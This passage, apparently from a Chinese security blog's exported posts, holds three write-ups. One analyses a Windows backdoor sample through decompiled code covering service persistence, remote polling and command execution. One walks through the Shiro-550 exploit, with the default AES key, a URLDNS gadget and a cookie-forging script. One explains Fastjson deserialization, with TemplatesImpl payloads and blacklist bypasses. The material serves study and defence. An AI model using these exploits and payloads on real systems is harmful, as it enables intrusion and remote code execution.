SC_HANDLE hServicea; // [sp+Ch] [bp-1408h]@9 char v4; // [sp+10h] [bp-1404h]@1 CHAR Filename; // [sp+410h] [bp-1004h]@14 CHAR DisplayName; // [sp+810h] [bp-C04h]@9 CHAR BinaryPathName; // [sp+C10h] [bp-804h]@6 SC_HANDLE hSCManager; // [sp+1010h] [bp-404h]@3 CHAR Src; // [sp+1014h] [bp-400h]@3 if ( sub_4025B0(&amp;v4) ) return 1; strcpy(&amp;Src, aSystemrootSyst); //aSystemrootSyst==%SYSTEMROOT%\\system32\\ strcat(&amp;Src, &amp;v4); strcat(&amp;Src, a_exe); hSCManager = OpenSCManagerA(0, 0, 0xF003Fu); //调用OpenSCManagerA，打开一个服务管理器， if ( !hSCManager ) return 1; hService = OpenServiceA(hSCManager, lpServiceName, 0xF01FFu); //服务即自身exe，创建一个服务， if ( hService ) //如果服务已经创建打开服务 &#123; if ( !ChangeServiceConfigA(hService, 0xFFFFFFFF, 2u, 0xFFFFFFFF, &amp;BinaryPathName, 0, 0, 0, 0, 0, 0) ) &#123; //并添加进启动项 CloseServiceHandle(hService); CloseServiceHandle(hSCManager); return 1; &#125; CloseServiceHandle(hService); CloseServiceHandle(hSCManager); &#125; else &#123; strcpy(&amp;DisplayName, lpServiceName); strcat(&amp;DisplayName, aManagerService); //创建一个服务 hServicea = CreateServiceA(hSCManager, lpServiceName, &amp;DisplayName, 0xF01FFu, 0x20u, 2u, 1u, &amp;Src, 0, 0, 0, 0, 0); if ( !hServicea ) &#123; CloseServiceHandle(hSCManager); return 1; &#125; CloseServiceHandle(hServicea); CloseServiceHandle(hSCManager); &#125; if ( ExpandEnvironmentStringsA(&amp;Src, &amp;BinaryPathName, 0x400u) ) &#123; if ( GetModuleFileNameA(0, &amp;Filename, 0x400u) ) &#123; if ( CopyFileA(&amp;Filename, &amp;BinaryPathName, 0) ) //将自己复制到 %SYSTEMROOT%\\\\system32\\\\xxx，即写进system32目录 &#123; if ( sub_4015B0(&amp;BinaryPathName) ) result = 1; else result = sub_401070(aUps, aHttpWww_practi, a80, a60) != 0; &#125; else &#123; result = 1; &#125; &#125; else &#123; result = 1; &#125; &#125; else &#123; result = 1; &#125; return result;&#125; 可以看到已启动自身服务 至此，-in参数分析结束 接着分析-re参数 修改参数为-re abcd 经过_mbscmp函数后eax返回值为1，跳转到-re参数 接着和-in参数一样call 40380f比较字符串,call 4025b0获取文件名 接着call 402900进入-re参数函数 反汇编查看代码,初步判断为删除服务的，od跟进看看 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667int __cdecl sub_402900(LPCSTR lpServiceName)&#123; int result; // eax@2 SC_HANDLE hService; // [sp+Ch] [bp-C08h]@3 char v3; // [sp+10h] [bp-C04h]@7 CHAR Dst; // [sp+410h] [bp-804h]@9 SC_HANDLE hSCManager; // [sp+810h] [bp-404h]@1 CHAR Src; // [sp+814h] [bp-400h]@9 hSCManager = OpenSCManagerA(0, 0, 0xF003Fu); if ( hSCManager ) &#123; hService = OpenServiceA(hSCManager, lpServiceName, 0xF01FFu); if ( hService ) &#123; if ( DeleteService(hService) ) &#123; CloseServiceHandle(hSCManager); CloseServiceHandle(hService); if ( sub_4025B0(&amp;v3) ) &#123; result = 1; &#125; else &#123; strcpy(&amp;Src, aSystemrootSyst); strcat(&amp;Src, &amp;v3); strcat(&amp;Src, a_exe); if ( ExpandEnvironmentStringsA(&amp;Src, &amp;Dst, 0x400u) ) &#123; if ( DeleteFileA(&amp;Dst) ) &#123; if ( sub_401070(&amp;unk_40EB60, &amp;unk_40EB60, &amp;unk_40EB60, &amp;unk_40EB60) ) result = 1; else result = sub_401210() != 0; &#125; else &#123; result = 1; &#125; &#125; else &#123; result = 1; &#125; &#125; &#125; else &#123; CloseServiceHandle(hSCManager); CloseServiceHandle(hService); result = 1; &#125; &#125; else &#123; CloseServiceHandle(hSCManager); result = 1; &#125; &#125; else &#123; result = 1; &#125; return result;&#125; 同样的流程，只不过open改为deleteService 跟进发现服务已禁用 接着deletefile 到此，对于-re参数功能的分析已经结束，我们知道这是删除服务功能； 下面分析-c参数 修改参数为-c abcd 进入调试执行，此处应该就是-c参数代码段 可以看到有2个jnz跳转(402cd9,402ccf) 因为参数为-c所以402cd9不跳转，接下来分析下402ccf,od中是跳转了的 简单反汇编一下可以看到，判断参数是否为7 如果不为7，则call 402410,之前分析过这个函数是删除自身 更改参数如图，实际指令为(xxxx.exe -c 111 222 333 444 abcd)共7个参数，后重新调试 可以看到进入401070函数，并对输入的参数111 222 333 444处理 参数入栈后调用401070,应该就是-c的函数了，进入看看 大概意思就是创建注册表key，然后设置value，一步一步跟进 打开注册表按照参数发现雀氏添加了所传入的参数 接着跳出main函数，结束 至此-c 参数分析完毕，即向指定注册表添加value 接着分析-cc abcd 有两个跳转，od跟进发现并没有跳转，先过。接着call 401280 反汇编查看代码 大概就是注册表查value 打开注册表，然后查值 跳出401280后call 402e74（感觉想printf函数） 发现将查询到的value打印出来，然后删除自身，结束 接下来分析无参，设置参数为abcd 跳转至此401000， 接着call 402360 发现是一个死循环，且通过401280和402020跳出循环 查看401280 猜测如果查询注册表中的value，则跳出循环 查看402020 代码较长不放了 先call了401e60 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162signed int __cdecl sub_401E60(char *a1, signed int a2)&#123; signed int result; // eax@2 u_short hostshort[2]; // [sp+8h] [bp-1424h]@3 char name; // [sp+Ch] [bp-1420h]@1 char *v5; // [sp+40Ch] [bp-1020h]@11 int v6; // [sp+410h] [bp-101Ch]@1 char *v7; // [sp+414h] [bp-1018h]@13 int v8; // [sp+418h] [bp-1014h]@5 char *v9; // [sp+428h] [bp-1004h]@9 char v10; // [sp+42Ch] [bp-1000h]@7 v6 = 4096; if ( sub_401420(&amp;name, 1024) ) &#123; result = 1; &#125; else if ( sub_401470(hostshort) ) &#123; result = 1; &#125; else if ( sub_401D80(&amp;v8) ) &#123; result = 1; &#125; else if ( sub_401AF0(&amp;name, hostshort[0], (int)&amp;v8, &amp;v10, (int)&amp;v6) ) &#123; result = 1; &#125; else &#123; v9 = strstr(&amp;v10, asc_40C090); if ( v9 ) &#123; v5 = v9; v9 = strstr(v9, asc_40C088); if ( v9 ) &#123; v7 = v9; if ( v9 - v5 + 1 &lt;= a2 ) &#123; qmemcpy(a1, &amp;v5[strlen(asc_40C090)], v7 - v5 - strlen(asc_40C090)); a1[v7 - v5 - strlen(asc_40C090)] = 0; result = 0; &#125; else &#123; result = 1; &#125; &#125; else &#123; result = 1; &#125; &#125; else &#123; result = 1; &#125; &#125; return result;&#125; 其中401420中调用了401280，即-cc参数，就是查询value 接着call了401470，进去看到call了401280和402f6a 接着call了401d80 先获取了当前时间time 然后4030e0函数将40C180的值赋为time 接着call 401D10，跟进去看 返回一个不是数字&amp;&amp;不是小写字母&amp;&amp;不是大写字母的v1（此处返回的是54） 不满足条件接着一直循环 跳出，接着call 401AF0，参数如栈中所示 代码如下，和socket网络通信有关 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556int __cdecl sub_401AF0(char *name, u_short hostshort, int a3, char *a4, int a5)&#123; int result; // eax@2 char v6; // [sp+10h] [bp-60Ch]@5 SOCKET s; // [sp+210h] [bp-40Ch]@1 int v8; // [sp+214h] [bp-408h]@1 char buf; // [sp+218h] [bp-404h]@3 int v10; // [sp+618h] [bp-4h]@5 s = 0; v8 = 0; if ( sub_401640((int)&amp;s, name, hostshort) ) return 1; strcpy(&amp;buf, aGet); strcat(&amp;buf, (const char *)a3); strcat(&amp;buf, aHttp1_0); if ( send(s, &amp;buf, strlen(&amp;buf), 0) == -1 ) &#123; closesocket(s); WSACleanup(); return 1; &#125; do &#123; v10 = recv(s, &amp;v6, 512, 0); if ( v10 &lt;= 0 ) &#123; if ( v10 ) &#123; sub_401740(&amp;s); return 1; &#125; continue; &#125; if ( (unsigned int)(v10 + v8) &gt; *(_DWORD *)a5 ) &#123; sub_401740(&amp;s); return 1; &#125; qmemcpy(&amp;a4[v8], &amp;v6, v10); v8 += v10; if ( strstr(a4, asc_40C068) ) break; &#125; while ( v10 &gt; 0 ); if ( sub_401740(&amp;s) ) &#123; result = 1; &#125; else &#123; *(_DWORD *)a5 = v8; result = 0; &#125; return result;&#125; 纵观以上，可以得到401e60主要功能为以下 12345678910111213141516171819202122232425262728293031323334353637int _cdecl sub_401E60(cahr *a1,signed int a2)&#123; signed int result; if(sub_401420(...))&#123; // 获取注册表键并截取 result = 1; &#125; else if(sub_401470(...))&#123; // 获取注册表键 result = 1; &#125; else if(sub_401D80(...))&#123; // 无聊的延时 resutl = 1; &#125; else if(sub_401AF0(...))&#123; // 网络Get和recv result = 1; &#125; else&#123; if(a = strstr(...))&#123; // 字符串匹配 if(b = strstr(...))&#123; if(b - a + 1 &lt;= a2)&#123; memcpy(a1 , ...); // 复制 a1[...] = 0; result = 0; &#125; else&#123; result = 1; &#125; &#125; else&#123; result = 1; &#125; &#125; else&#123; result = 1; &#125; &#125; return result;&#125; 如果获取字符串成功，则进入40204C，可以看到类似于一个后门功能 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465int __cdecl sub_402020(char *name)&#123; const char *v2; // ST2C_4@4 int v3; // ST30_4@4 char *v4; // eax@6 u_short v5; // ST24_2@6 char *v6; // ST28_4@6 char *v7; // eax@10 u_short v8; // ST1C_2@10 char *lpFileName; // ST20_4@10 char *v10; // eax@14 const char *v11; // ST18_4@14 u_short hostshort; // [sp+4h] [bp-424h]@14 FILE *v13; // [sp+8h] [bp-420h]@14 char v14; // [sp+28h] [bp-400h]@1 if ( sub_401E60(&amp;v14, 1024) ) return 1; if ( !strncmp(&amp;v14, aSleep, strlen(aSleep)) ) &#123; strtok(&amp;v14, asc_40C0C0); v2 = strtok(0, asc_40C0C0); v3 = atoi(v2); Sleep(1000 * v3); &#125; else if ( !strncmp(&amp;v14, aUpload, strlen(aUpload)) ) &#123; strtok(&amp;v14, asc_40C0C0); v4 = strtok(0, asc_40C0C0); v5 = atoi(v4); v6 = strtok(0, asc_40C0C0); if ( sub_4019E0(name, v5, v6) ) return 1; &#125; else if ( !strncmp(&amp;v14, aDownload, strlen(aDownload)) ) &#123; strtok(&amp;v14, asc_40C0C0); v7 = strtok(0, asc_40C0C0); v8 = atoi(v7); lpFileName = strtok(0, asc_40C0C0); if ( sub_401870(name, v8, lpFileName) ) return 1; &#125; else if ( !strncmp(&amp;v14, aCmd, strlen(aCmd)) ) &#123; strtok(&amp;v14, asc_40C0C0); v10 = strtok(0, asc_40C0C0); hostshort = atoi(v10); v11 = strtok(0, asc_40C0A4); v13 = _popen(v11, aRb); if ( !v13 ) return 1; if ( sub_401790(name, hostshort, v13) ) &#123; _pclose(v13); return 1; &#125; _pclose(v13); &#125; else &#123; strncmp(&amp;v14, aNothing, strlen(aNothing)); &#125; return 0;&#125; 可以实现cmd，和upload","categories":[{"name":"恶意代码","slug":"恶意代码","permalink":"http://example.com/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"http://example.com/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"二进制","slug":"二进制","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"}]},{"title":"Shiro反序列化漏洞","slug":"shiro","date":"2022-08-06T13:16:50.000Z","updated":"2022-09-01T00:54:12.897Z","comments":true,"path":"2022/08/06/shiro/","link":"","permalink":"http://example.com/2022/08/06/shiro/","excerpt":"","text":"Shiro环境搭建 所需环境 123jdk8u65 Tomcat8shiro 1.2.4 shiro环境直接clone p神的github地址 启动tomcat，即可看到 Shiro550分析漏洞原理 勾选 RememberMe 字段，登陆成功的话，返回包 set-Cookie 会有 rememberMe&#x3D;deleteMe 字 段，还会有 rememberMe 字段，之后的所有请求中 Cookie 都会有 rememberMe 字段，那么就 可以利用这个 rememberMe 进行反序列化，从而 getshell。 1234567891011121314151617181920212223242526////RequestPOST /shirodemo_war/login.jsp HTTP/1.1Host: 192.168.124.15:8081Content-Length: 56Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://192.168.124.15:8081Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://192.168.124.15:8081/shirodemo_war/login.jspAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeusername=root&amp;password=secret&amp;rememberMe=on&amp;submit=Login////ResponseHTTP/1.1 302 Set-Cookie: JSESSIONID=1467280596697A870D71F2A15C2E5B84; Path=/shirodemo_war; HttpOnlySet-Cookie: rememberMe=deleteMe; Path=/shirodemo_war; Max-Age=0; Expires=Mon, 29-Aug-2022 06:06:08 GMTSet-Cookie: rememberMe=TJ1wpcFQ6EgXmXmmHQ06fysKrMk3tVUeNsh42bYAnXePmFLX+a9DUp7SyfQcdXvFBHHEY0lPYFGP4TtwJA8MgiQVNrol9LIHlwzUlSkz2ZkCUkUYgW0aGK1Ben6bfU1wLp56z/ygIC0x1qXDDYzzRhdMHptkdPOCTJ1DVgtDP51AeESfhuKP/EVJI5JS+e/QTXReg8GtYowZ48PvWTf65YGwp+j+/LNCbn1Wsk1V5xYf9P7q2Xmm6Zh4C5nV2siStTq32oVYtmkowJSV9LCCTsjAZ0Nw+p5tGxsIbmJU3viTOh1PnMKT2XDEiYor7Jr/SKnjsWkYBWSkSvLs+sPRGwVXUVI1LZ3er9UIzsgWse/lOjXdJ8uV71CATvqaG+71HDy9S8byDEdIW1kMh7zigLTEKAp2edgJi3X19vIcoQBkB3ZSJSEcAwG3tCTfyeSnMFJjNa3NmJ+jMyYQO3Q/oZkSbn7fGRG5aIX0OILCDI7Mk9k9YnkIfijo60KrJEcc; Path=/shirodemo_war; Max-Age=31536000; Expires=Wed, 30-Aug-2023 06:06:08 GMT; HttpOnlyLocation: /shirodemo_war/;jsessionid=1467280596697A870D71F2A15C2E5B84Content-Length: 0Date: Tue, 30 Aug 2022 06:06:08 GMTConnection: close 根本原因是AES 加密的密钥默认硬编码在代码里（Shiro-550） cookie解密分析 idea全局查找cookie关键字，发现一下与shiro框架相关的class 123public interface Cookiepublic class SimpleCookie implements Cookiepublic class CookieRememberMeManager extends AbstractRememberMeManager 跟进CookieRememberMeManager查看相关函数 这个方法中先判断cookie base64后是否为deleteme，是的话则返回，否则base解密后返回，看看谁调用了这个方法 跟进convertBytesToPrincipals看看 、 此函数对base64解密后的byte流进行decrypt，然后反序列化。跟进看看 获取cipherService后对bytes解密 其中getDecryptionCipherKey()为获取加解秘钥 跟进cipherService发现使用的是Aes加密，秘钥为base64加密的kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D; 总结上述流程，发现shiro对cookie解密流程为 base64() -&gt; Aes() 之后得到序列化内容 跟进反序列化函数查看 cookie加密分析 在onSuccessfulLogin下断点 可以看到token为明文 跟进 可见和解密过程对称，以上就是cookie加解密全过程 shiro550利用 DNS探测 1234567891011121314151617181920212223242526272829URLDNS链public class urldns &#123; public static void main(String[] args) throws IOException, NoSuchMethodException, InstantiationException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException &#123; HashMap&lt;URL,Object&gt; hashMap = new HashMap&lt;&gt;(); URL url = new URL(&quot;https://fudjktkkeq3jv7koksa072r6exkn8c.burpcollaborator.net&quot;); Class urlClass = URL.class; Field fieldHashCode = urlClass.getDeclaredField(&quot;hashCode&quot;); fieldHashCode.setAccessible(true); fieldHashCode.set(url,123456); hashMap.put(url,123); fieldHashCode.set(url,-1); serialize(hashMap); //unSerialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object obj) throws IOException &#123; ObjectOutputStream ooStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); ooStream.writeObject(obj); &#125; public static Object unSerialize(String fileName) throws IOException, ClassNotFoundException &#123; ObjectInputStream oiStrean = new ObjectInputStream(new FileInputStream(fileName)); Object obj = oiStrean.readObject(); return obj; &#125;&#125; python加密脚本 12345678910111213141516171819202122232425from Crypto.Cipher import AESimport uuidimport base64 def convert_bin(file): with open(file,&#x27;rb&#x27;) as f: return f.read() def AES_enc(data): BS=AES.block_size pad=lambda s:s+((BS-len(s)%BS)*chr(BS-len(s)%BS)).encode() key=&quot;kPH+bIxk5D2deZiIxcaaaA==&quot; mode=AES.MODE_CBC iv=uuid.uuid4().bytes encryptor=AES.new(base64.b64decode(key),mode,iv) ciphertext=base64.b64encode(iv+encryptor.encrypt(pad(data))) return ciphertext if __name__==&quot;__main__&quot;: data=convert_bin(&quot;ser.bin&quot;) print(AES_enc(data))结果：LPWtx1kiT9aPgmH56vw8ertCoG8oAFBmIu3ZtNyaoQtCK9vOekQ4Tx4dKtoxKOsRizCxYoIlWHkHJqvzIZQ5YpgqYEoUVEVqExcCH5xVfbgQD12/ge8euUyZiwIXNouGyO4GbSYEdenS437PYmBvIhQqh3nUrY1KKoVRPOb+F0FxWe9cYXHO/QXvPoLAwIyO/YQte8bW02bYOA26SSKbMLQ4glOTf52JbwLkVB6Shfc4ylY8kDEx34F/E2pwDMk1JNbQfDoUVUAYTN4JEcr4MidEZm5m/1pPnXvvF00A+m+h5ajsDrRRBnOGiqZb6FdHmyh1tA/KUcFMtS29hiEMwDqne0J/9keqnz+9216OF35lWkGcwrOxo7Kab1XCJwM2OR8clh8EtGjO4SQPixNemLcaAPMD23yj5u7d/6EpqmyQ01/93kzt6ATeIjahg9ftNrly9P5oFpF383710PONt5bA80uFU9NY9PRAGstfoITH1hvXynn76HdD3qCZxrqGyP11eQlU1sKByp1ncS9Pqg== 抓包该cookie，利用成功","categories":[{"name":"java安全","slug":"java安全","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"java安全","slug":"java安全","permalink":"http://example.com/tags/java%E5%AE%89%E5%85%A8/"},{"name":"java框架","slug":"java框架","permalink":"http://example.com/tags/java%E6%A1%86%E6%9E%B6/"}]},{"title":"Fastjson 反序列化漏洞","slug":"fastjson漏洞原理","date":"2022-07-31T13:16:50.000Z","updated":"2022-09-01T00:38:50.463Z","comments":true,"path":"2022/07/31/fastjson漏洞原理/","link":"","permalink":"http://example.com/2022/07/31/fastjson%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/","excerpt":"","text":"fastjson 反序列化漏洞fastjson介绍 在前后端数据传输交互中,经常会遇到字符串(String)与json,XML等格式相互转换与解析，其中json以跨语言，跨前后端的优点在开发中被频繁使用，基本上可以说是标准的数据交换格式。fastjson 是一个java语言编写的高性能且功能完善的JSON库，它采用一种“假定有序快速匹配”的算法，把JSON Parse 的性能提升到了极致。它的接口简单易用，已经被广泛使用在缓存序列化，协议交互，Web输出等各种应用场景中。 FastJson是啊里巴巴的的开源库，用于对JSON格式的数据进行解析和打包。 漏洞介绍fastjson在序列化以及反序列化的过程中并没有使用Java自带的序列化机制，而是自定义了一套机制。其实，对于JSON框架来说，想要把一个Java对象转换成字符串，可以有两种选择：基于属性基于setter&#x2F;getter 12345678910class Apple implements Fruit &#123; private Big_Decimal price; //省略 setter/getter、toString等&#125;class iphone implements Fruit &#123; private Big_Decimal price; //省略 setter/getter、toString等&#125; 123toJSONString : &#123;&quot;fruit&quot;:&#123;&quot;price&quot;:0.5&#125;&#125;toJSONString : &#123;&quot;fruit&quot;:&#123;&quot;price&quot;:500&#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public class Fastjson &#123; public String name; public String age; public Fastjson() throws IOException &#123; this.name=&quot;james&quot;; this.age=&quot;18&quot;; &#125; public void setName(String test) &#123; System.out.println(&quot;name setter called&quot;); this.name = test; &#125; public String getName() &#123; System.out.println(&quot;name getter called&quot;); return this.name; &#125; public void setAge(String test) &#123; System.out.println(&quot;age setter called&quot;); this.age = test; &#125; public String getAge()&#123; System.out.println(&quot;age getter called&quot;); return this.age; &#125; @Override public String toString() &#123; return &quot;Fastjson&#123;&quot; + &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &quot;, age=&#x27;&quot; + age + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125; public static void main(String[] args) throws IOException &#123; //ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String o = JSON.toJSONString(new Fastjson()); System.out.println(o); //class转为json System.out.println(&quot;------------&quot;); Fastjson obj = (Fastjson) JSON.parse(&quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.fastjson.test.Fastjson\\&quot;,\\&quot;name\\&quot;:\\&quot;test name\\&quot;, \\&quot;age\\&quot;:\\&quot;test age\\&quot;&#125;&quot;); System.out.println(obj); //普通json对象转为object类 &#125;&#125;output://age getter calledname getter called&#123;&quot;age&quot;:&quot;18&quot;,&quot;name&quot;:&quot;james&quot;&#125;------------name setter calledage setter calledFastjson&#123;name=&#x27;test name&#x27;, age=&#x27;test age&#x27;&#125; 12345678为了解决上述问题：fastjson引入了AutoType，即在序列化的时候，把原始类型记录下来。&#123; &quot;fruit&quot;:&#123; &quot;@type&quot;:&quot;com.hollis.lab.fastjson.test.Apple&quot;, &quot;price&quot;:0.5 &#125;&#125; fastjson 在反序列化的时候会去找我们在 @type 中规定的类是哪个类，然后在反序列化的时候会自动调用这些 setter 与 getter 方法的调用，注意！并不是所有的 setter 和 getter 方法。 下面直接引用结论，Fastjson会对满足下列要求的setter&#x2F;getter方法进行调用： 1234567891011满足条件的setter：- 非静态函数- 返回类型为void或当前类- 参数个数为1个满足条件的getter：- 非静态方法- 无参数- **返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong** 我个人理解 fastjson 的利用攻击其实是蛮简单的，因为没有那么多复杂的链子，也不需要反射修改值，直接在 json 串里面赋值就好了。 漏洞原理由前面知道，Fastjson是自己实现的一套序列化和反序列化机制，不是用的Java原生的序列化和反序列化机制。无论是哪个版本，Fastjson反序列化漏洞的原理都是一样的，只不过不同版本是针对不同的黑名单或者利用不同利用链来进行绕过利用而已。 通过Fastjson反序列化漏洞，攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行。 那么如何才能够反序列化出恶意类呢？ 由前面demo知道，Fastjson使用parseObject()&#x2F;parse()进行反序列化的时候可以指定类型。如果指定的类型太大，包含太多子类，就有利用空间了。例如，如果指定类型为Object或JSONObject，则可以反序列化出来任意类。例如代码写Object o = JSON.parseObject(poc,Object.class)就可以反序列化出Object类或其任意子类，而Object又是任意类的父类，所以就可以反序列化出所有类。 如何才能触发反序列化得到的恶意类中的恶意函数呢? 由前面知道，在某些情况下进行反序列化时会将反序列化得到的类的构造函数、getter方法、setter方法执行一遍，如果这三种方法中存在危险操作，则可能导致反序列化漏洞的存在。换句话说，就是攻击者传入要进行反序列化的类中的构造函数、getter方法、setter方法中要存在漏洞才能触发。 我们到DefaultJSONParser.parseObject(Map object, Object fieldName)中看下，JSON中以@type形式传入的类的时候，调用deserializer.deserialize()处理该类，并去调用这个类的setter和getter方法： 1234567public final Object parseObject(final Map object, Object fieldName) &#123; ... // JSON.DEFAULT_TYPE_KEY即@type if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123; ... ObjectDeserializer deserializer = config.getDeserializer(clazz); return deserializer.deserialze(this, clazz, fieldName); 整个解析过程相当复杂，知道结论就ok了。 小结一下若反序列化指定类型的类如Student obj = JSON.parseObject(text, Student.class);，该类本身的构造函数、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞； 123456public void setName(String test) throws IOException &#123; System.out.println(&quot;name setter called&quot;); Runtime.getRuntime().exec(&quot;calc&quot;); this.name = test; &#125;//弹出calc 若反序列化未指定类型的类如Object obj = JSON.parseObject(text, Object.class);，该若该类的子类的构造方法、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞； PoC 写法一般的，Fastjson反序列化漏洞的PoC写法如下，@type指定了反序列化得到的类 12345&#123;&quot;@type&quot;:&quot;xxx.xxx.xxx&quot;,&quot;xxx&quot;:&quot;xxx&quot;,...&#125; 关键是要找出一个特殊的在目标环境中已存在的类，满足如下两个条件： 该类的构造函数、setter方法、getter方法中的某一个存在危险操作，比如造成命令执行； 可以控制该漏洞函数的变量（一般就是该类的属性）； 漏洞Demo由前面比较的案例知道，当反序列化指定的类型是Object.class，即代码为Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);时，反序列化得到的类的构造函数、所有属性的setter方法、properties私有属性的getter方法都会被调用，因此我们这里直接做最简单的修改，将Student类中会被调用的getter方法添加漏洞代码，这里修改getProperties()作为演示： 12345678910111213141516171819202122232425262728293031323334353637383940414243import java.util.Properties; public class Student &#123; private String name; private int age; private String address; private Properties properties; public Student() &#123; System.out.println(&quot;构造函数&quot;); &#125; public String getName() &#123; System.out.println(&quot;getName&quot;); return name; &#125; public void setName(String name) &#123; System.out.println(&quot;setName&quot;); this.name = name; &#125; public int getAge() &#123; System.out.println(&quot;getAge&quot;); return age; &#125; // public void setAge(int age) &#123; // System.out.println(&quot;setAge&quot;); // this.age = age; // &#125; public String getAddress() &#123; System.out.println(&quot;getAddress&quot;); return address; &#125; public Properties getProperties() throws Exception&#123; System.out.println(&quot;getProperties&quot;); Runtime.getRuntime().exec(&quot;calc&quot;); return properties; &#125; &#125; FastjsonEasyPoC.java 12345678910111213import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import com.alibaba.fastjson.parser.Feature; public class FastjsonEasyPoC &#123; public static void main(String[] args)&#123; String jsonString =&quot;&#123;\\&quot;@type\\&quot;:\\&quot;Student\\&quot;,\\&quot;age\\&quot;:6,\\&quot;name\\&quot;:\\&quot;Drunkbaby\\&quot;,\\&quot;address\\&quot;:\\&quot;china\\&quot;,\\&quot;properties\\&quot;:&#123;&#125;&#125;&quot;; Object obj = JSON.parseObject(jsonString, Object.class); System.out.println(obj); System.out.println(obj.getClass().getName()); &#125; &#125; 很明显，前面的Demo中反序列化的类是一个Object类，该类是任意类的父类，其子类Student存在Fastjson反序列化漏洞，当@type指向Student类是反序列化就会触发漏洞。 对于另一种反序列化指定类的情景，是该指定类本身就存在漏洞，比如我们将上述Demo中反序列化那行代码改成直接反序列化得到Student类而非Object类，这样就是另一个触发也是最直接的触发场景： 漏洞攻防史 v1.2.24之前 @type自动加载类 v1.2.41之前， fastjson默认关闭了autotype支持，并且加入了checkAutotype （过滤@type里的值，黑白名 单过滤） 加载的过程中，fastjson有一段特殊的处理，那就是在具体加载类的时候会去掉className前后的L和后面的分号;，形如Lcom.lang.Thread; Lcom.sun.rowset.JdbcRowSetImpl; v1.2.42 在进行黑白名单检测的时候，fastjson先判断目标类的类名的前后是不是L和;，如果是的话，就截取掉前后的L和;再进行黑白名单的校验 LLcom.sun.rowset.JdbcRowSetImpl;; v1.2.43 fastjson这次在黑白名单判断之前，增加了一个是否以LL未开头的判断 在目标类前面添加[ v1.2.44版本中，fastjson的作者做了更加严格的要求，只要目标类以[开头或者以;结尾 v1.2.47 autoType不开启反而会被攻击。因为在fastjson中有一个全局缓存，在类加载的时候，如果autotype没开启，会先尝试从缓存中获取类，如果缓存中有，则直接返回。java.lang.Class类对应的deserializer为MiscCodec，反序列化时会取json串中的val值并加载这个val对应的类。如果fastjson cache为true，就会缓存这个val对应的class到全局缓存中 v1.2.68 利用异常进行攻击 OOM在fastjson中， 如果@type 指定的类为 Throwable 的子类，那对应的反序列化处理类就会使用到 ThrowableDeserializer而在ThrowableDeserializer#deserialze的方法中，当有一个字段的key也是 @type时，就会把这个 value 当做类名，然后进行一次 checkAutoType 检测。并且指定了expectClass为Throwable.class，但是在checkAutoType中，有这样一约定，那就是如果指定了expectClass ，那么也会通过校验。因为fastjson在反序列化的时候会尝试执行里面的getter方法，而Exception类中都有一个getMessage方法。只需要自定义一个异常，并且重写其getMessage就达到了攻击的目的。 漏洞分析fastjson1.2.24TemplatesImpl 漏洞利用链 1234561.构造一个 TemplatesImpl 类的反序列化字符串，其中 _bytecodes 是我们构造的恶意类的类字节码，这个类的父类是 AbstractTranslet，最终这个类会被加载并使用 newInstance() 实例化。2.在反序列化过程中，由于getter方法 getOutputProperties()，满足条件，将会被 fastjson 调用，而这个方法触发了整个漏洞利用流程：getOutputProperties() -&gt; newTransformer()-&gt; getTransletInstance() -&gt; defineTransletClasses() / EvilClass.newInstance(). payload 1234567&#123; &quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;, &quot;_bytecodes&quot;: [&quot;yv66vgAAADQA...CJAAk=&quot;], &quot;_name&quot;: &quot;su18&quot;, &quot;_tfactory&quot;: &#123;&#125;, &quot;_outputProperties&quot;: &#123;&#125;,&#125; 代码 12345678910111213141516public class Fastjson24poc &#123; public static void main(String[] args) &#123; //TemplatesImpl String byteCode = &quot;xxxxxxxxxxxxxxx&quot;; //构造TemplatesImpl的json数据，并将恶意类注入到json数据中 final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;; String payload = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;&quot; + NASTY_CLASS + &quot;\\&quot;,\\&quot;_bytecodes\\&quot;:[\\&quot;&quot;+byteCode+&quot;\\&quot;],&quot; + &quot;&#x27;_name&#x27;:&#x27;TempletaPoc&#x27;,&quot; + &quot;&#x27;_tfactory&#x27;:&#123;&#125;,&quot; 